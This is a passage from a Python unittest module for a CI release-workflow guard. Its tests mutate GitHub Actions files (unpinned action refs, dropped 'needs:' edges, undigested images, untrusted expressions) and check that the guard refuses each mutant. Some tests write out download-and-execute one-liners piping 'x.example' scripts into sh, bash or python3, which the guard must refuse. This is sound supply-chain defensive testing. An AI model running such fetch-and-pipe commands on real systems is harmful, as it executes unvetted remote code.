"""Release-feature guard residue of umbrella #6062: #6289, #6290, #6904, #8002, #8020, #8021 and #8023.

Each test mutates the release workflows of the tree this module runs in (never
a hard-coded copy) and requires scripts/check_release_features.py to refuse the
mutant; the unmutated tree is the control and must pass. Run:

    python3 -I -m unittest discover -s scripts/ci/tests

Stdlib only, Python 3.9+.
"""
import importlib.util
import re
import subprocess
import sys
import tempfile
import unittest
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
SCRIPT = ROOT / "scripts" / "check_release_features.py"
REL = ROOT / ".github" / "workflows" / "release.yml"
SHAPE = ROOT / ".github" / "workflows" / "release-shape.yml"
C8 = ROOT / ".github" / "workflows" / "c8-precheck.yml"
PUBLISH = ROOT / ".github" / "workflows" / "publish-ci-image.yml"

# One entry per issue this PR closes. SELF_CHECK below requires every issue to
# have at least one pinned case and the count to equal this list.
CLOSES = (6289, 6290, 6904, 8002, 8020, 8021, 8023, 8030, 8031, 8032, 8039)
PINNED_CASES = {}  # issue number -> list of test method names, filled by pins()


def pins(issue):
    def deco(fn):
        PINNED_CASES.setdefault(issue, []).append(fn.__name__)
        return fn
    return deco


def load_guard():
    spec = importlib.util.spec_from_file_location("check_release_features_under_test", SCRIPT)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


G = load_guard()


def read(path):
    return path.read_bytes().decode("utf-8")


def job_span(text, job):
    m = re.search(r"(?m)^  %s:\n(?:(?!^  [A-Za-z0-9_-]+:\n).*\n?)*" % re.escape(job), text)
    if m is None:
        raise AssertionError("job %s not found" % job)
    return m.start(), m.end()


def edit_job(text, job, fn):
    a, b = job_span(text, job)
    new = fn(text[a:b])
    if new == text[a:b]:
        raise AssertionError("mutation of job %s changed nothing" % job)
    return text[:a] + new + text[b:]


def set_needs(text, job, value):
    def fn(body):
        return re.sub(r"(?m)^    needs:.*\n", ("    needs: %s\n" % value) if value else "", body, count=1)
    return edit_job(text, job, fn)


def errors_release(text):
    rep = G.Report()
    G.check_release_yml(text, rep)
    return rep.errors


def errors_shape(text):
    rep = G.Report()
    G.check_shape(text, rep)
    return rep.errors


JOBS_WITH_NEEDS = ("qualify", "supply-chain", "release", "sbom", "mobile-ios", "mobile-android",
                   "crates-io", "homebrew", "docker", "copr")


class Controls(unittest.TestCase):
    def test_shipped_workflows_pass(self):
        self.assertEqual(errors_release(read(REL)), [])
        self.assertEqual(errors_shape(read(SHAPE)), [])

    def test_self_check_pinned_case_count_equals_closes(self):
        """The pinned-case count equals the Closes count (11)."""
        self.assertEqual(len(CLOSES), 11)
        self.assertEqual(sorted(PINNED_CASES), sorted(CLOSES))
        for issue in CLOSES:
            self.assertTrue(PINNED_CASES[issue], "no pinned case for #%d" % issue)


class Needs6289(unittest.TestCase):
    """#6289: "Check every job's needs against that table ... Refuse any missing job and any extra job."
    A job's `needs:` may not shrink while the guard stays green."""

    @pins(6289)
    def test_every_job_refuses_a_shortened_needs(self):
        """#6289: shorten each job's needs to [preflight]; the guard must refuse all of them."""
        base = read(REL)
        survivors = []
        for job in JOBS_WITH_NEEDS:
            if not errors_release(set_needs(base, job, "[preflight]")):
                survivors.append(job)
        self.assertEqual(survivors, [], "needs: edge dropped with the guard green")

    @pins(6289)
    def test_every_job_refuses_a_removed_needs(self):
        """#6289: remove each job's needs: key entirely; the guard must refuse all of them."""
        base = read(REL)
        survivors = [j for j in JOBS_WITH_NEEDS if not errors_release(set_needs(base, j, ""))]
        self.assertEqual(survivors, [])

    @pins(6289)
    def test_root_job_may_not_gain_needs(self):
        """#6289: preflight is the root; a needs: on it is refused."""
        def fn(body):
            return body.replace("  preflight:\n", "  preflight:\n    needs: qualify\n", 1)
        self.assertTrue(errors_release(edit_job(read(REL), "preflight", fn)))

    @pins(6289)
    def test_publish_jobs_keep_the_release_edge(self):
        """#6289: crates-io, homebrew and copr must stay behind `release`."""
        base = read(REL)
        for job in ("crates-io", "homebrew", "copr"):
            self.assertTrue(errors_release(set_needs(base, job, "[preflight, qualify, supply-chain]")), job)


def shape_step_edit(marker, line):
    text = read(SHAPE)
    i = text.index(marker)
    j = text.index("\n", i) + 1
    return text[:j] + line + text[j:]


class Shape6290(unittest.TestCase):
    """#6290: "Pin the release-shape job's step list whole: step count, then the exact key set and body
    of each step." A step-level if:/continue-on-error: on a non-proof step must be refused."""

    @pins(6290)
    def test_if_false_on_guard_step(self):
        """#6290: `if: false` on the Release feature declaration guard step is refused."""
        self.assertTrue(errors_shape(shape_step_edit("      - name: Release feature declaration guard\n", "        if: false\n")))

    @pins(6290)
    def test_continue_on_error_on_guard_step(self):
        """#6290: `continue-on-error: true` on the guard step is refused."""
        self.assertTrue(errors_shape(shape_step_edit("      - name: Release feature declaration guard\n",
                                                     "        continue-on-error: true\n")))

    @pins(6290)
    def test_continue_on_error_on_checkout(self):
        """#6290: `continue-on-error: true` on the checkout step is refused."""
        self.assertTrue(errors_shape(shape_step_edit("      - uses: actions/checkout@", "        continue-on-error: true\n")))

    @pins(6290)
    def test_modifiers_on_other_steps(self):
        """#6290: if:/continue-on-error:/timeout-minutes: on any non-build, non-proof step is refused."""
        for marker in ("      - name: Install Rust 1.98.0",
                       "      - uses: Swatinem/rust-cache@",
                       "      - name: No OpenSSL / libpq / native-tls",
                       "      - name: Start a TLS PostgreSQL service"):
            for line in ("        if: false\n", "        continue-on-error: true\n", "        timeout-minutes: 1\n"):
                self.assertTrue(errors_shape(shape_step_edit(marker, line)), (marker, line))

    @pins(6290)
    def test_cleanup_if_always_narrowed(self):
        """#6290: the cleanup step's `if: always()` narrowed to success() is refused."""
        text = read(SHAPE).replace("        if: always()\n", "        if: success()\n", 1)
        self.assertTrue(errors_shape(text))

    @pins(6290)
    def test_step_appended(self):
        """#6290: a step appended to the job is refused (the step list is pinned whole)."""
        text = read(SHAPE).rstrip("\n") + "\n\n      - name: x\n        run: echo\n"
        self.assertTrue(errors_shape(text))


class Uses6904(unittest.TestCase):
    """#6904: "walks every `uses:` in all three workflows and rejects any value whose ref after `@` is
    not a 40-hex SHA (allow ./local and docker://...@sha256:)"."""

    def uses_mutants(self):
        text = read(REL)
        sha = re.compile(r"(uses:\s*)([A-Za-z0-9_.-]+/[A-Za-z0-9_./-]+)@([0-9a-f]{40})")
        found = list(sha.finditer(text))
        self.assertGreater(len(found), 20)
        return text, found

    @pins(6904)
    def test_every_release_uses_repointed_to_a_tag(self):
        """#6904: repoint each `uses:` of release.yml, one at a time, to a mutable tag; all are refused."""
        text, found = self.uses_mutants()
        survivors = []
        for m in found:
            mut = text[:m.start(3)] + "v4" + text[m.end(3):]
            if not errors_release(mut):
                survivors.append(text.count("\n", 0, m.start()) + 1)
        self.assertEqual(survivors, [], "release.yml lines whose mutable-tag mutant is accepted")

    @pins(6904)
    def test_malformed_refs_refused(self):
        """#6904: a 39-hex, upper-case, branch or docker-tag ref is refused in preflight and crates-io."""
        text = read(REL)
        for job in ("preflight", "qualify", "crates-io", "homebrew", "copr", "mobile-ios", "mobile-android"):
            a, b = job_span(text, job)
            m = re.search(r"uses:\s*[A-Za-z0-9_.-]+/[A-Za-z0-9_./-]+@([0-9a-f]{40})", text[a:b])
            self.assertIsNotNone(m, job)
            s, e = a + m.start(1), a + m.end(1)
            for ref in (text[s:e - 1], text[s:e].upper(), "main", "v1"):
                self.assertTrue(errors_release(text[:s] + ref + text[e:]), (job, ref))

    @pins(6904)
    def test_docker_tag_ref_refused(self):
        """#6904: docker://alpine:3 (a tag, no sha256 digest) replaces a pinned action and is refused."""
        text = read(REL)
        m = re.search(r"uses:\s*actions/checkout@[0-9a-f]{40}", text)
        self.assertTrue(errors_release(text[:m.start()] + "uses: docker://alpine:3" + text[m.end():]))

    @pins(6904)
    def test_shape_workflow_uses_refused(self):
        """#6904: every `uses:` of release-shape.yml repointed to a tag is refused."""
        text = read(SHAPE)
        found = list(re.finditer(r"uses:\s*[A-Za-z0-9_.-]+/[A-Za-z0-9_./-]+@([0-9a-f]{40})", text))
        self.assertGreaterEqual(len(found), 3)
        for m in found:
            self.assertTrue(errors_shape(text[:m.start(1)] + "v4" + text[m.end(1):]), m.group(0))

    @pins(6904)
    def test_local_and_digest_forms_are_accepted(self):
        """#6904: a ./local action and docker://...@sha256:<64 hex> are the allowed non-sha forms."""
        pattern = getattr(G, "USES_PINNED_RE", None)
        self.assertIsNotNone(pattern, "USES_PINNED_RE is not defined")
        self.assertTrue(pattern.fullmatch("./.github/actions/x"))
        self.assertTrue(pattern.fullmatch("docker://alpine@sha256:" + "a" * 64))
        self.assertFalse(pattern.fullmatch("docker://alpine:3"))
        self.assertFalse(pattern.fullmatch("actions/checkout@v4"))


def scratch():
    d = ROOT / ".local-runs"
    d.mkdir(exist_ok=True)
    return str(d)


class FailClosed(unittest.TestCase):
    """The guard compares the workflows in the tree it runs on and is never green on a skipped check."""

    def make_tree(self, tmp, drop=None):
        for rel in ("scripts/release-features.sh", ".github/workflows/release.yml",
                    ".github/workflows/release-shape.yml", ".github/workflows/c8-precheck.yml",
                    ".github/workflows/publish-ci-image.yml", "Dockerfile", "docs/INSTALL.md"):
            if rel == drop:
                continue
            dst = Path(tmp) / rel
            dst.parent.mkdir(parents=True, exist_ok=True)
            dst.write_bytes((ROOT / rel).read_bytes())
        return Path(tmp)

    def test_missing_workflow_is_not_green(self):
        """A missing release.yml is a failure, never OK."""
        with tempfile.TemporaryDirectory(dir=scratch()) as tmp:
            root = self.make_tree(tmp, drop=".github/workflows/release.yml")
            errors, _ = G.run_guard(root)
            self.assertTrue(errors)

    def test_undecodable_workflow_is_exit_2(self):
        """A non-UTF-8 release.yml is undecidable: InputError, exit 2."""
        with tempfile.TemporaryDirectory(dir=scratch()) as tmp:
            root = self.make_tree(tmp)
            (root / ".github/workflows/release.yml").write_bytes(b"\xff\xfe\x00bad")
            self.assertEqual(G.main([str(root)]), 2)

    def test_unmutated_tree_copy_is_exit_0(self):
        with tempfile.TemporaryDirectory(dir=scratch()) as tmp:
            root = self.make_tree(tmp)
            self.assertEqual(G.main([str(root)]), 0)


SHA_USES = re.compile(r"(uses:\s*)([A-Za-z0-9_.-]+/[A-Za-z0-9_./-]+)@([0-9a-f]{40})")


def first_use_to_tag(text):
    m = SHA_USES.search(text)
    assert m is not None
    return text[:m.start(3)] + "v4" + text[m.end(3):]


def tree_with(tmp, rel, text):
    root = FailClosed().make_tree(tmp)
    (root / rel).write_bytes(text.encode("utf-8"))
    return root


class Walked8002(unittest.TestCase):
    """#8002 / #8020 (part of #6904): the `uses:` walk covers c8-precheck.yml and the publish-ci path."""

    def every_use(self, path, label):
        text = read(path)
        found = list(SHA_USES.finditer(text))
        self.assertGreater(len(found), 3, label)
        survivors = []
        # #8032: through run_guard (the wiring that was broken at e7ceaddbf), not check_uses_pinned alone
        with tempfile.TemporaryDirectory(dir=scratch()) as tmp:
            root = FailClosed().make_tree(tmp)
            target = root / (".github/workflows/" + label)
            for m in found:
                target.write_bytes((text[:m.start(3)] + "v4" + text[m.end(3):]).encode("utf-8"))
                errors, _ = G.run_guard(root)
                if not any(label in e and "#6904" in e for e in errors):
                    survivors.append(text.count("\n", 0, m.start()) + 1)
        self.assertEqual(survivors, [], label)

    @pins(8032)
    @pins(8002)
    def test_c8_precheck_every_use_refused_by_the_walk(self):
        """#8002: every `uses:` of c8-precheck.yml repointed to a tag is refused by run_guard."""
        self.every_use(C8, "c8-precheck.yml")

    @pins(8002)
    def test_c8_precheck_tag_is_refused_by_the_guard(self):
        """#8002: run_guard refuses a c8-precheck.yml whose first `uses:` is @v4."""
        with tempfile.TemporaryDirectory(dir=scratch()) as tmp:
            root = tree_with(tmp, ".github/workflows/c8-precheck.yml", first_use_to_tag(read(C8)))
            errors, _ = G.run_guard(root)
            self.assertTrue(any("c8-precheck.yml" in e and "#6904" in e for e in errors), errors)

    @pins(8032)
    @pins(8020)
    def test_publish_ci_every_use_refused_by_the_walk(self):
        """#8020: every `uses:` of publish-ci-image.yml repointed to a tag is refused by run_guard."""
        self.every_use(PUBLISH, "publish-ci-image.yml")

    @pins(8020)
    def test_publish_ci_tag_is_refused_by_the_guard(self):
        """#8020: run_guard refuses a publish-ci-image.yml whose first `uses:` is @v4."""
        with tempfile.TemporaryDirectory(dir=scratch()) as tmp:
            root = tree_with(tmp, ".github/workflows/publish-ci-image.yml", first_use_to_tag(read(PUBLISH)))
            errors, _ = G.run_guard(root)
            self.assertTrue(any("publish-ci-image.yml" in e and "#6904" in e for e in errors), errors)

    @pins(8020)
    def test_missing_publish_or_c8_workflow_is_not_green(self):
        """#8020: a missing c8-precheck.yml or publish-ci-image.yml is a failure, never OK."""
        for rel in (".github/workflows/c8-precheck.yml", ".github/workflows/publish-ci-image.yml"):
            with tempfile.TemporaryDirectory(dir=scratch()) as tmp:
                root = FailClosed().make_tree(tmp, drop=rel)
                errors, _ = G.run_guard(root)
                self.assertTrue(errors, rel)

    @pins(8020)
    def test_undecodable_publish_or_c8_workflow_is_exit_2(self):
        """#8020: a non-UTF-8 c8-precheck.yml or publish-ci-image.yml is undecidable: exit 2."""
        for rel in (".github/workflows/c8-precheck.yml", ".github/workflows/publish-ci-image.yml"):
            with tempfile.TemporaryDirectory(dir=scratch()) as tmp:
                root = FailClosed().make_tree(tmp)
                (root / rel).write_bytes(b"\xff\xfe\x00bad")
                self.assertEqual(G.main([str(root)]), 2, rel)


REPIN = "0" * 40  # a valid 40-hex sha that is not the pinned one


class PerAction8030(unittest.TestCase):
    """#8030 (the #6904 acceptance): "a per-action `*_USES` constant comparison where one exists"."""

    def repin_checkout(self, text, job):
        """Repin the first actions/checkout of ``job`` to another 40-hex sha."""
        a, b = job_span(text, job)
        m = re.search(r"uses:\s*actions/checkout@([0-9a-f]{40})", text[a:b])
        self.assertIsNotNone(m, job)
        s, e = a + m.start(1), a + m.end(1)
        return text[:s] + REPIN + text[e:]

    @pins(8030)
    def test_preflight_and_crates_io_checkout_repin_refused_by_the_guard(self):
        """#8030: the reviewer's two real-CLI mutants (rc=0 at 19e2cc8ee) are refused with job, step and constant."""
        for job in ("preflight", "crates-io"):
            with tempfile.TemporaryDirectory(dir=scratch()) as tmp:
                root = tree_with(tmp, ".github/workflows/release.yml", self.repin_checkout(read(REL), job))
                errors, _ = G.run_guard(root)
                hits = [e for e in errors if "CHECKOUT_USES" in e]
                self.assertEqual(len(hits), 1, (job, errors))
                self.assertIn("release.yml", hits[0])
                self.assertIn("job `%s`" % job, hits[0])
                self.assertIn("step ", hits[0])
                self.assertIn(G.CHECKOUT_USES, hits[0])
                self.assertEqual(G.main([str(root)]), 1, job)

    @pins(8030)
    def test_every_checkout_repin_refused_in_all_four_workflows(self):
        """#8030: each of the 48 actions/checkout refs repinned to another sha is refused, one at a time."""
        survivors, total = [], 0
        for path, label in ((REL, "release.yml"), (SHAPE, "release-shape.yml"), (C8, "c8-precheck.yml"),
                            (PUBLISH, "publish-ci-image.yml")):
            text = read(path)
            for m in re.finditer(r"uses:\s*actions/checkout@([0-9a-f]{40})", text):
                total += 1
                mut = text[:m.start(1)] + REPIN + text[m.end(1):]
                if label == "release.yml":
                    errs = errors_release(mut)
                else:
                    rep = G.Report()
                    G.check_uses_pinned(G.parse_yaml(mut, label, rep), label, rep)
                    errs = rep.errors
                if not errs:
                    survivors.append((label, text.count("\n", 0, m.start()) + 1))
        self.assertEqual(total, 48)
        self.assertEqual(survivors, [])

    @pins(8030)
    def test_other_actions_with_a_constant_are_compared(self):
        """#8030: the other *_USES constants (publish-ci-image.yml buildx/login/build) are compared as well."""
        text = read(PUBLISH)
        for const in (G.BUILDX_USES, G.LOGIN_USES, G.IMAGE_BUILD_USES):
            action = const.split("@")[0]
            mut = text.replace(const, action + "@" + REPIN, 1)
            self.assertNotEqual(mut, text, const)
            rep = G.Report()
            G.check_uses_pinned(G.parse_yaml(mut, "publish-ci-image.yml", rep), "publish-ci-image.yml", rep)
            self.assertTrue(any("job `" in e and "step " in e and G.USES_CONSTANTS[const] in e for e in rep.errors),
                            (const, rep.errors))


class Survivors8039(unittest.TestCase):
    """#8039: the four mutants the round-2 sweep reported as survivors (refusal lines 753, 1399, 1463 and
    condition 11) are killed by --self-test again."""

    PHRASES = ("value outside the subset grammar", "inline use of the declaration", "the pg proof must run after")

    def self_test_rc(self, tmp, name, source):
        mutant = Path(tmp) / name
        mutant.write_text(source, encoding="utf-8")
        res = subprocess.run([sys.executable, "-I", str(mutant), "--self-test", str(ROOT)],
                             capture_output=True, text=True)
        return res.returncode

    @pins(8039)
    def test_the_four_survivors_are_killed_by_the_self_test(self):
        """#8039: neutralising each of the 3 refusals, or the proof-order condition, makes --self-test fail."""
        src = SCRIPT.read_bytes()
        sites = G._refusal_sites(src)
        mutants = []
        for phrase in self.PHRASES:
            # the call whose own message holds the phrase: the nearest site at or before it
            at = src.index(phrase.encode())
            _, s, e = max((site for site in sites if site[1] <= at), key=lambda site: site[1])
            mutants.append((phrase, src[:s] + b"(lambda *_a, **_k: None)" + src[e:]))
        text = src.decode("utf-8")
        cond = [m for m in G.CONDITION_MUTANTS if m[0] == "proof order against the build not compared"]
        self.assertEqual(len(cond), 1)
        cut = text.index(G.CONDITION_MARKER + "\n")  # the anchor is counted above the table, as the sweep does
        self.assertEqual(text[:cut].count(cond[0][1]), 1)
        mutants.append((cond[0][0], (text[:cut].replace(cond[0][1], cond[0][2], 1) + text[cut:]).encode("utf-8")))
        with tempfile.TemporaryDirectory(dir=scratch()) as tmp:
            with ThreadPoolExecutor(max_workers=4) as pool:
                rcs = list(pool.map(lambda m: (m[0], self.self_test_rc(tmp, "m%d.py" % abs(hash(m[0])), m[1].decode("utf-8"))),
                                    mutants))
        self.assertEqual([name for name, rc in rcs if rc == 0], [], "mutants the self-test accepts")


class Numbered8031(unittest.TestCase):
    """#8031: a `uses:` refusal numbers the step 1-based, as the #6290 `steps.N` messages do."""

    @pins(8031)
    def test_first_step_is_step_1(self):
        """#8031: the first step of publish-ci-image.yml is `step 1` (was `step 0`)."""
        rep = G.Report()
        doc = G.parse_yaml(first_use_to_tag(read(PUBLISH)), "publish-ci-image.yml", rep)
        G.check_uses_pinned(doc, "publish-ci-image.yml", rep)
        self.assertEqual(len(rep.errors), 1, rep.errors)
        self.assertIn("job `publish-ci-image` step 1:", rep.errors[0])
        self.assertNotIn("step 0", rep.errors[0])

    @pins(8031)
    def test_every_step_is_numbered_by_its_position(self):
        """#8031: each tag-pinned `uses:` of publish-ci-image.yml reports the 1-based position of its step."""
        text = read(PUBLISH)
        for m in SHA_USES.finditer(text):
            steps_at = text.rindex("    steps:", 0, m.start())
            position = len(re.findall(r"(?m)^      - ", text[steps_at:m.start()]))
            mut = text[:m.start(3)] + "v4" + text[m.end(3):]
            rep = G.Report()
            G.check_uses_pinned(G.parse_yaml(mut, "publish-ci-image.yml", rep), "publish-ci-image.yml", rep)
            self.assertEqual(len(rep.errors), 1, rep.errors)
            self.assertIn(" step %d" % position, rep.errors[0], (position, rep.errors[0][:120]))


class Named8021(unittest.TestCase):
    """#8021: the `uses:` refusal names the job and the step, not only a line number."""

    @pins(8021)
    def test_error_names_job_and_step(self):
        """#8021: a tag-pinned crates-io step is reported with its job and step."""
        text = read(REL)
        a, b = job_span(text, "crates-io")
        mut = text[:a] + first_use_to_tag(text[a:b]) + text[b:]
        errs = [e for e in errors_release(mut) if "#6904" in e]
        self.assertEqual(len(errs), 1, errs)
        self.assertIn("job `crates-io`", errs[0])
        self.assertIn("step ", errs[0])
        self.assertIn("release.yml", errs[0])

    @pins(8021)
    def test_error_names_the_job_in_another_workflow(self):
        """#8021: the same naming for c8-precheck.yml."""
        rep = G.Report()
        doc = G.parse_yaml(first_use_to_tag(read(C8)), "c8-precheck.yml", rep)
        G.check_uses_pinned(doc, "c8-precheck.yml", rep)
        self.assertEqual(len(rep.errors), 1, rep.errors)
        self.assertIn("job `c8-precheck`", rep.errors[0])


NEW_CELLS = (
    "N1 root job preflight gains needs is refused",
    "N2 homebrew needs drops release is refused",
    "N3 release.yml preflight uses repointed to a tag is refused",
    "N11 release.yml crates-io uses repointed to a tag is refused",
    "N4 release-shape.yml uses repointed to a tag is refused",
    "N5 c8-precheck.yml uses repointed to a tag is refused",
    "N6 publish-ci-image.yml uses repointed to a tag is refused",
    "N7 release-shape holds a non-mapping step is refused",
    "N8 release-shape step appended is refused",
    "N10 release-shape guard step gains if: false is refused",
)


SHA40 = "11d5960a326750d5838078e36cf38b85af677262"
DIGEST = "sha256:" + "ab" * 32
ACTION_DIR = ".github/actions/probe"


class Round5(unittest.TestCase):
    """Round 5 (security review of 00fb32f18, umbrella #8199): F1 case-normalised owner/repo match,
    F2 digest-pinned container and services images, F3 shape checks, F4 run: content, F5 local actions."""

    def crates(self, fn):
        return edit_job(read(REL), "crates-io", fn)

    def crates_steps(self, extra_steps):
        return self.crates(lambda b: b.replace("    steps:\n", "    steps:\n" + extra_steps, 1))

    def crates_header(self, extra):
        return self.crates(lambda b: b.replace("    steps:\n", extra + "    steps:\n", 1))

    def guard(self, text, extra_files=None):
        with tempfile.TemporaryDirectory(dir=scratch()) as tmp:
            root = tree_with(tmp, ".github/workflows/release.yml", text)
            for rel, body in (extra_files or {}).items():
                dst = root / rel
                dst.parent.mkdir(parents=True, exist_ok=True)
                dst.write_text(body, encoding="utf-8")
            return G.run_guard(root)[0]

    def refused(self, text, needle="", extra_files=None):
        errors = self.guard(text, extra_files)
        self.assertTrue(errors, "the guard accepted the mutant")
        if needle:
            self.assertTrue(any(needle in e for e in errors), (needle, errors[:3]))

    # ---- F1
    def test_f1_case_variant_owner_with_another_sha_refused(self):
        other = "0" * 40
        for job in ("preflight", "crates-io"):
            mut = edit_job(read(REL), job, lambda b: b.replace("actions/checkout@" + SHA40, "Actions/Checkout@" + other, 1))
            self.refused(mut, "CHECKOUT_USES")
        text = read(C8).replace("actions/checkout@" + SHA40, "ACTIONS/checkout@" + other, 1)
        rep = G.Report()
        G.check_uses_pinned(G.parse_yaml(text, "c8-precheck.yml", rep), "c8-precheck.yml", rep)
        self.assertTrue(any("CHECKOUT_USES" in e for e in rep.errors), rep.errors)

    def test_f1_subpath_variant_with_another_sha_refused(self):
        other = "0" * 40
        mut = self.crates(lambda b: b.replace("actions/checkout@" + SHA40, "actions/checkout/sub@" + other, 1))
        self.refused(mut, "CHECKOUT_USES")
        errs = self.guard(mut)
        self.assertTrue(any("/sub" in e for e in errs), errs[:3])

    def test_f1_dot_segments_in_a_uses_path_refused(self):
        mut = self.crates(lambda b: b.replace("actions/checkout@" + SHA40, "actions/checkout/../x@" + SHA40, 1))
        self.refused(mut)

    # ---- F2
    def test_f2_container_string_must_be_digest_pinned(self):
        for img in ("rust:latest", "rust", "rust:1.98@sha256:abc"):
            self.refused(self.crates_header("    container: %s\n" % img), "container")
        ok = self.guard(self.crates_header("    container: rust:1.98@%s\n" % DIGEST))
        self.assertFalse([e for e in ok if "container" in e], ok)
        self.refused(self.crates_header("    container: rust:latest\n"), "crates-io")

    def test_f2_container_mapping_image_must_be_digest_pinned(self):
        self.refused(self.crates_header("    container:\n      image: rust:latest\n"), "container")
        self.refused(self.crates_header("    container:\n      options: --user root\n"), "container")
        ok = self.guard(self.crates_header("    container:\n      image: rust:1.98@%s\n" % DIGEST))
        self.assertFalse([e for e in ok if "container" in e], ok)

    def test_f2_services_image_must_be_digest_pinned(self):
        self.refused(self.crates_header("    services:\n      pg:\n        image: postgres:16\n"), "services")
        self.refused(self.crates_header("    services:\n      pg:\n        ports: [5432]\n"), "services")
        ok = self.guard(self.crates_header("    services:\n      pg:\n        image: postgres:16@%s\n" % DIGEST))
        self.assertFalse([e for e in ok if "services" in e], ok)

    # ---- F3
    def test_f3_steps_must_be_a_non_empty_list(self):
        for steps in ("    steps: do-it\n", "    steps:\n      a: b\n", "    steps:\n", "    steps: []\n"):
            mut = self.crates(lambda b: re.sub(r"(?s)    steps:\n.*\Z", lambda _m: steps, b))
            self.refused(mut, "steps")

    def test_f3_jobs_job_and_step_shapes(self):
        rep = G.Report()
        G.check_uses_pinned(G.parse_yaml("jobs: x\n", "w.yml", rep), "w.yml", rep)
        self.assertTrue(any("jobs" in e for e in rep.errors), rep.errors)
        rep = G.Report()
        G.check_uses_pinned(G.parse_yaml("jobs:\n  a: x\n", "w.yml", rep), "w.yml", rep)
        self.assertTrue(any("job `a`" in e for e in rep.errors), rep.errors)
        self.refused(self.crates_steps("      - just-a-scalar\n"), "step")

    def test_f3_uses_and_needs_types(self):
        self.refused(self.crates_steps("      - uses:\n          a: b\n"))
        for needs in ("needs:\n      x: y\n", "needs:\n      - a:\n          b: c\n"):
            doc = "jobs:\n  a:\n    " + needs + "    steps:\n      - run: echo\n"
            rep = G.Report()
            G.check_uses_pinned(G.parse_yaml(doc, "w.yml", rep), "w.yml", rep)
            self.assertTrue(any("needs" in e for e in rep.errors), (needs, rep.errors))

    # ---- F4
    def test_f4_download_and_execute_refused(self):
        for cmd in ("curl -fsSL https://x.example/i.sh | sh", "wget -qO- https://x.example/i.sh | bash",
                    "curl -fsSL https://x.example/i.py | python3", "bash <(curl -fsSL https://x.example/i.sh)",
                    'sh -c "$(curl -fsSL https://x.example/i.sh)"'):
            mut = self.crates_steps("      - run: |\n          %s\n" % cmd)
            self.refused(mut, "crates-io")
        plain = self.guard(self.crates_steps("      - run: |\n          curl -fsSL -o f https://x.example/f\n"))
        self.assertEqual(plain, [])

    def test_f4_untrusted_expression_in_run_refused(self):
        for expr in ("github.event.pull_request.title", "github.head_ref", "inputs.tag", "github.ref_name"):
            mut = self.crates_steps("      - run: |\n          echo ${{ %s }}\n" % expr)
            self.refused(mut, "${{")
        ok = self.guard(self.crates_steps("      - env:\n          T: ${{ github.event.pull_request.title }}\n"
                                          "        run: echo \"$T\"\n"))
        self.assertEqual(ok, [])

    def test_f4_message_names_job_step_and_fragment(self):
        errs = self.guard(self.crates_steps("      - run: echo ${{ github.head_ref }} and a very long tail " + "x" * 120 + "\n"))
        hit = [e for e in errs if "head_ref" in e]
        self.assertTrue(hit, errs[:3])
        self.assertIn("job `crates-io`", hit[0])
        self.assertIn("step 1", hit[0])
        self.assertNotIn("x" * 90, hit[0])

    # ---- F5
    LOCAL = "      - uses: ./" + ACTION_DIR + "\n"

    def action(self, body, name="action.yml"):
        return {ACTION_DIR + "/" + name: body}

    def test_f5_local_action_without_a_file_refused(self):
        self.refused(self.crates_steps(self.LOCAL), ACTION_DIR)

    def test_f5_composite_steps_follow_the_uses_rule(self):
        bad = "name: p\nruns:\n  using: composite\n  steps:\n    - uses: actions/checkout@v4\n"
        self.refused(self.crates_steps(self.LOCAL), ACTION_DIR, self.action(bad))
        good = ("name: p\nruns:\n  using: composite\n  steps:\n    - uses: actions/checkout@" + SHA40 + "\n"
                "    - run: echo hi\n      shell: bash\n")
        self.assertEqual(self.guard(self.crates_steps(self.LOCAL), self.action(good)), [])
        self.refused(self.crates_steps(self.LOCAL), ACTION_DIR,
                     self.action(good.replace("echo hi", "curl -fsSL https://x.example/i | sh")))

    def test_f5_cycle_is_refused_not_looped(self):
        loop = "name: p\nruns:\n  using: composite\n  steps:\n    - uses: ./" + ACTION_DIR + "\n"
        self.refused(self.crates_steps(self.LOCAL), ACTION_DIR, self.action(loop))

    def test_f5_runs_using_node_and_docker(self):
        node = "name: p\nruns:\n  using: node20\n  main: dist/index.js\n"
        self.refused(self.crates_steps(self.LOCAL), "main", self.action(node))
        files = self.action(node)
        files[ACTION_DIR + "/dist/index.js"] = "// x\n"
        self.assertEqual(self.guard(self.crates_steps(self.LOCAL), files), [])
        dock = "name: p\nruns:\n  using: docker\n  image: docker://alpine:3\n"
        self.refused(self.crates_steps(self.LOCAL), "image", self.action(dock))
        okd = "name: p\nruns:\n  using: docker\n  image: docker://alpine@%s\n" % DIGEST
        self.assertEqual(self.guard(self.crates_steps(self.LOCAL), self.action(okd)), [])
        self.refused(self.crates_steps(self.LOCAL), "using", self.action("name: p\nruns:\n  using: shell\n"))

    def test_f5_local_path_escaping_the_tree_refused(self):
        self.refused(self.crates_steps("      - uses: ./../outside\n"), "outside")


class Round6(unittest.TestCase):
    """Round 6 (code review r4 and security review r2 of b2fecbb92, umbrella #8199): the `run:` text is held to an
    allow-list (3-agent vote 6def5ab6, option B), the runner labels and the `on:` block are pinned, and a local
    action is walked once."""

    def step(self, body, ident=None, env=None, style="|"):
        parts = []
        if ident:
            parts.append("id: %s\n" % ident)
        if env:
            parts.append("env:\n" + "".join("  %s: %s\n" % kv for kv in env.items()))
        parts.append("run: %s\n" % style + "".join("  %s\n" % ln for ln in body.split("\n")))
        out = ""
        for n, part in enumerate(parts):
            lines = part.rstrip("\n").split("\n")
            out += ("      - " if n == 0 else "        ") + lines[0] + "\n"
            out += "".join("        " + ln + "\n" for ln in lines[1:])
        return out

    def doc(self, steps, head="", runs_on="ubuntu-latest"):
        return "jobs:\n  a:\n    runs-on: %s\n%s    steps:\n%s" % (runs_on, head, steps)

    def errs(self, text, name="w.yml", root=None):
        rep = G.Report()
        rep.root = root
        doc = G.parse_yaml(text, name, rep)
        if doc is not None:
            G.check_uses_pinned(doc, name, rep)
        return rep.errors

    def assertCaught(self, text, needle=""):
        errs = self.errs(text)
        self.assertTrue(errs, "the guard accepted the mutant")
        if needle:
            self.assertTrue(any(needle in e for e in errs), (needle, errs[:3]))

    # ---- R4-1 and security 1: the expression allow-list
    def test_expression_roots_outside_the_allow_list_refused(self):
        for expr in ("env.X", "toJSON(github)", "github", "github.ref", "vars.X", "needs.a.outputs.b",
                     "format('{0}', matrix.os)", "matrix.os", "matrix", "secrets.A.B", "inputs.tag",
                     "github.event.inputs.tag", "fromJSON('1')", "matrix.os == 'x'", "matrix['os']"):
